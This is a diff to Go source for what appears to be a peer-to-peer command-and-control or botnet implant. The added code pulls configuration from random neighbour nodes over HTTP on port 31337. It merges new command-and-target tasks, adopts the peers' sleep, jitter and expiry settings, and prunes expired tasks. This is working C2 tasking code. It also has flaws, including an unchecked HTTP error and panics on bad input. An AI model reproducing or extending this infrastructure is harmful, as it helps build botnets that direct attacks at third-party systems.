@@ -85,7 +85,7 @@ func generateNewConfig() Config {
 	return newConfiguration
 }
 
-// Attempts to add add a node as a neighbor if necessary.
+// Attempts to add a node as a neighbor if necessary.
 func processNewNode(address string) bool {
 	if (address != configuration.Neighbors[0]) && (address != configuration.Neighbors[1]) && (address != configuration.Neighbors[2]) {
 		if configuration.Neighbors[0] == "" {
@@ -108,15 +108,47 @@ func sendReconnect() {
 
 func updateInformation() {
 	randVal := rand.IntN(3)
+	var newConfiguration Config
 	pullURL := "http://" + configuration.Neighbors[randVal] + ":31337/api/pull"
 	resp, _ := http.Get(pullURL)
 	body, err := io.ReadAll(resp.Body)
 	if err != nil {
 		checkNeighbors()
 	}
-	json.Unmarshal(body, &configuration)
-	defer resp.Body.Close()
+	err = json.Unmarshal(body, &newConfiguration)
+	if err != nil {
+		panic("meowdy")
+	}
+	defer func(Body io.ReadCloser) {
+		err := Body.Close()
+		if err != nil {
+			panic("close error")
+		}
+	}(resp.Body)
 	fmt.Println(resp.Request.Body)
+	for _, i := range newConfiguration.TaskList {
+		match := false
+		for _, j := range configuration.TaskList {
+			if i.Command == j.Command && i.Target == j.Target {
+				match = true
+				break
+			}
+		}
+		if !match {
+			configuration.TaskList[i.Identifier.String()] = i
+		}
+	}
+	configuration.Neighbors = newConfiguration.Neighbors
+	configuration.Identifier = newConfiguration.Identifier
+	configuration.LastUpdate = newConfiguration.LastUpdate
+	configuration.CommandEOL = newConfiguration.CommandEOL
+	configuration.JitterValue = newConfiguration.JitterValue
+	configuration.SleepTimer = newConfiguration.SleepTimer
+	for k, v := range configuration.TaskList {
+		if v.DeployTime.Add(time.Second * time.Duration(configuration.CommandEOL)).Before(time.Now()) {
+			delete(configuration.TaskList, k)
+		}
+	}
 }
 
 func broadcastUUID() {
